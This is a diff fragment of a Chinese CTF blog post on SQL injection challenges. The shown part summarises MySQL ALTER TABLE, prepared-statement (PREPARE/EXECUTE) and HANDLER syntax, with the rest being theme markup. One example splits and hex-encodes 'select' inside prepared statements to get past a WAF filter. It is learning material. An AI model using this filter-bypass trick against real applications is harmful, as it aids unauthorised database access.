+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name1&quot; rename to &quot;table_name2&quot;;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>改变字段的数据类型</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table &quot;table_name&quot; modify &quot;column_name&quot; type;<br>&#x2F;&#x2F;or<br>alter table &quot;table_name&quot; change &quot;column_name&quot; &quot;column_name&quot; type;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name&quot; modify &quot;column_name&quot; type;</span><br><span class="line">&#x2F;&#x2F;or</span><br><span class="line">alter table &quot;table_name&quot; change &quot;column_name&quot; &quot;column_name&quot; type;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>改字段名 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table &quot;table_name&quot; change &quot;column1&quot; &quot;column2&quot; type;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name&quot; change &quot;column1&quot; &quot;column2&quot; type;</span><br></pre></td></tr></table></figure>
 
 
 <h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>（ps：mysql版本&lt;4.1是不支持服务段预编译的）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">PREPARE stmt_name FROM preparable_stm					#预编译一条mysql语句<br>EXECUTE stmt_name [USING @var_name [, @var_name] ...]	#执行预编译的语句<br>&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name					#释放预编译语句<br># ps：当预编译条数达到阈值会报错<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt_name FROM preparable_stm					#预编译一条mysql语句</span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...]	#执行预编译的语句</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name					#释放预编译语句</span><br><span class="line"># ps：当预编译条数达到阈值会报错</span><br></pre></td></tr></table></figure>
 <ul>
 <li>eg1：将数据插入表中</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare try1 from &#39;insert into ttable1 select ?,?&#39;;		#此处1个?匹配1个变量<br>set @a&#x3D;111,@b&#x3D;&#39;hhh&#39;;<br>execute try1 using @a,@b;<br></code></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/03/09/t3pIw8hciF4lf6V.png" srcset="/img/loading.gif" alt="数据成功插入到表中"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prepare try1 from &#39;insert into ttable1 select ?,?&#39;;		#此处1个?匹配1个变量</span><br><span class="line">set @a&#x3D;111,@b&#x3D;&#39;hhh&#39;;</span><br><span class="line">execute try1 using @a,@b;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/03/09/t3pIw8hciF4lf6V.png" alt="数据成功插入到表中"></p>
 <ul>
 <li>eg2:查看表中信息</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @a &#x3D; &#39;select * from &#96;ttable1&#96;&#39;;<br>prepare try2 from @a;<br>execute try2;<br></code></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/03/09/2hAOLzexfM8Wa1m.png" srcset="/img/loading.gif" alt="成功执行语句，查看表中数据"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a &#x3D; &#39;select * from &#96;ttable1&#96;&#39;;</span><br><span class="line">prepare try2 from @a;</span><br><span class="line">execute try2;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/03/09/2hAOLzexfM8Wa1m.png" alt="成功执行语句，查看表中数据"></p>
 <ul>
 <li>eg3:可以利用编码转换已经concat()组合，再ctf中绕过waf</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @a &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;ttable1&#96;;&#39;);<br>&#x2F;&#x2F;or set @a &#x3D; 0x7365272c276c656374202a2066726f6d2060747461626c653160;<br>prepare try3 from @a;<br>execute try3;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @a &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;ttable1&#96;;&#39;);</span><br><span class="line">&#x2F;&#x2F;or set @a &#x3D; 0x7365272c276c656374202a2066726f6d2060747461626c653160;</span><br><span class="line">prepare try3 from @a;</span><br><span class="line">execute try3;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>释放：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">deallocate prepare try1;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deallocate prepare try1;</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="handle"><a href="#handle" class="headerlink" title="handle"></a>handle</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># handle语法：<br>HANDLER tbl_name OPEN [ [AS] alias]<br><br>HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)<br> [ WHERE where_condition ] [LIMIT ... ]<br>HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;<br> [ WHERE where_condition ] [LIMIT ... ]<br>HANDLER tbl_name READ &#123; FIRST | NEXT &#125;<br> [ WHERE where_condition ] [LIMIT ... ]<br><br>HANDLER tbl_name CLOSE<br></code></pre></td></tr></table></figure>
+<h2 id="handle"><a href="#handle" class="headerlink" title="handle"></a>handle</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># handle语法：</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line"> [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line"> [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line"> [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>
 <ul>
 <li><p><code>HANDLER tbl_name OPEN [ [AS] alias]</code>:<br>打开一张表（不返回结果，但声明了一个句柄，句柄名通过可选项alias控制，否则默认为表名）<br><code>HANDLER tbl_name CLOSE</code>：关闭打开的句柄</p>
 </li>
@@ -355,363 +246,41 @@
 </li>
 </ul>
 <p>官方文档：（使用页面翻译–可能不太准确）</p>
-<p><img src="https://i.loli.net/2021/03/09/4qavKBciRZ2VAne.png" srcset="/img/loading.gif" alt="官方文档"></p>
+<p><img src="https://i.loli.net/2021/03/09/4qavKBciRZ2VAne.png" alt="官方文档"></p>
 <blockquote>
-<p>sql约束：用以规定表中数据的规则<br><img src="https://i.loli.net/2021/03/09/8qAgPSLMfV2RIN9.png" srcset="/img/loading.gif"></p>
+<p>sql约束：用以规定表中数据的规则<br><img src="https://i.loli.net/2021/03/09/8qAgPSLMfV2RIN9.png"></p>
 </blockquote>
-
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2021/04/19/VulnStack1/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">VulnStack1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2021/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-                        <span class="hidden-mobile">php伪协议的学习</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-              <!-- Comments -->
-              <article class="comments" id="comments">
-                
-                
-  <div id="vcomments"></div>
-  <script type="text/javascript">
-    Fluid.utils.waitElementVisible('vcomments', function() {
-      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
-        new Valine({
-          el: "#vcomments",
-          app_id: "zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz",
-          app_key: "y4AXlgIqQsV7Enr3IFS3r6Ck",
-          placeholder: "欢迎评论噢~",
-          path: window.location.pathname,
-          avatar: "retro",
-          meta: ["nick","mail","link"],
-          pageSize: "10",
-          lang: "zh-CN",
-          highlight: true,
-          recordIP: false,
-          serverURLs: "",
-        });
-      });
-    });
-  </script>
-  <noscript>Please enable JavaScript to view the
-    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
-  </noscript>
-
-
-              </article>
-            
-          </article>
-        </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-
-    
-
-    
-      <a id="scroll-top-button" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-    
-
-    
-  </main>
-
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-  </div>
-
-
-  
-  <div class="statistics">
-    
-    
-
-    
-      
-        <!-- LeanCloud 统计PV -->
-        <span id="leancloud-site-pv-container" style="display: none">
-            总访问量 
-            <span id="leancloud-site-pv"></span>
-             次
-          </span>
-      
-      
-        <!-- LeanCloud 统计UV -->
-        <span id="leancloud-site-uv-container" style="display: none">
-            总访客数 
-            <span id="leancloud-site-uv"></span>
-             人
-          </span>
-      
-
-    
-  </div>
-
-
-  
-
-  
-
-<span id="sitetime"></span>
-<script language=javascript>
-	function siteTime(){
-		window.setTimeout("siteTime()", 1000);
-		var seconds = 1000;
-		var minutes = seconds * 60;
-		var hours = minutes * 60;
-		var days = hours * 24;
-		var years = days * 365;
-		var today = new Date();
-		var todayYear = today.getFullYear();
-		var todayMonth = today.getMonth()+1;
-		var todayDate = today.getDate();
-		var todayHour = today.getHours();
-		var todayMinute = today.getMinutes();
-		var todaySecond = today.getSeconds();
-		/* 
-		Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
-		year - 作为date对象的年份，为4位年份值
-		month - 0-11之间的整数，做为date对象的月份
-		day - 1-31之间的整数，做为date对象的天数
-		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
-		minutes - 0-59之间的整数，做为date对象的分钟数
-		seconds - 0-59之间的整数，做为date对象的秒数
-		microseconds - 0-999之间的整数，做为date对象的毫秒数
-        */
-		var t1 = Date.UTC(2020,12,30,00,00,00); //北京时间2020-12-30 00:00:00
-		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
-		var diff = t2-t1;
-		var diffYears = Math.floor(diff/years);
-		var diffDays = Math.floor((diff/days)-diffYears*365);
-		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
-		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
-		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
-		document.getElementById("sitetime").innerHTML=" 自Na0h将神光棒放入此地已"+/*diffYears+" 年 "+*/diffDays+" 天"+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒🌩٩(๏̯๏)۶❤ ";
-	}
-	siteTime();
-</script>
-
-
-</footer>
-
-
-<!-- SCRIPTS -->
-
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
-
-
-
-  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
-
-
-
-
-  <script defer src="/js/leancloud.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    (function () {
-      var path = "/local-search.xml";
-      var inputArea = document.querySelector("#local-search-input");
-      inputArea.onclick = function () {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-        this.onclick = null
-      }
-    })()
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-    <!-- Google Analytics -->
-    <script defer>
-      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
-      ga.l = +new Date;
-      ga('create', 'G-MLL1PZ9RBK', 'auto');
-      ga('send', 'pageview');
-    </script>
-    <script async src='https://www.google-analytics.com/analytics.js'></script>
-  
-
-  
-    <!-- Google gtag.js -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=260676474"></script>
-    <script defer>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', '260676474');
-    </script>
-  
-
-  
-
-  
-
-  
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
-
-
-
-
-
-<script type="text/javascript"
-color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
-</script>
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Na0H_1e3</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://na0hblog.top/2021/03/09/%E9%9A%8F%E4%BE%BF%E6%B3%A8blacklist%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/">http://na0hblog.top/2021/03/09/%E9%9A%8F%E4%BE%BF%E6%B3%A8blacklist%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://na0hblog.top" target="_blank">Na0H的神光棒存放地</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></div><div class="post_share"><div class="social-share" data-image="/img/atimg/12.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/19/VulnStack1/"><img class="prev-cover" src="/img/atimg/15.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">VulnStack1</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><img class="next-cover" src="/img/atimg/11.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php伪协议的学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/04/21/web知识小记/" title="web知识小记（长期更|大概）"><img class="cover" src="/img/atimg/13.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-21</div><div class="title">web知识小记（长期更|大概）</div></div></a></div><div><a href="/2021/02/25/php伪协议/" title="php伪协议的学习"><img class="cover" src="/img/atimg/11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-25</div><div class="title">php伪协议的学习</div></div></a></div><div><a href="/2021/02/16/渗透前的信息收集/" title="渗透测试前的一些信息收集"><img class="cover" src="/img/atimg/9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-16</div><div class="title">渗透测试前的一些信息收集</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">[强网杯2019]随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951"><span class="toc-number">2.1.</span> <span class="toc-text">解法1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952"><span class="toc-number">2.2.</span> <span class="toc-text">解法2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-number">3.</span> <span class="toc-text">[GYCTF2020]Blacklist</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%953"><span class="toc-number">3.1.</span> <span class="toc-text">解法3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#alert"><span class="toc-number">4.1.</span> <span class="toc-text">alert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-number">4.2.</span> <span class="toc-text">预处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#handle"><span class="toc-number">4.3.</span> <span class="toc-text">handle</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/wl.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Na0H_1e3</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">一点诚心，万缘俱息</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz',
+      appKey: 'y4AXlgIqQsV7Enr3IFS3r6Ck',
+      placeholder: '欢迎评论噢~',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="153,255,204" opacity="0.7" zIndex="-1" count="108" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script></div></body></html>
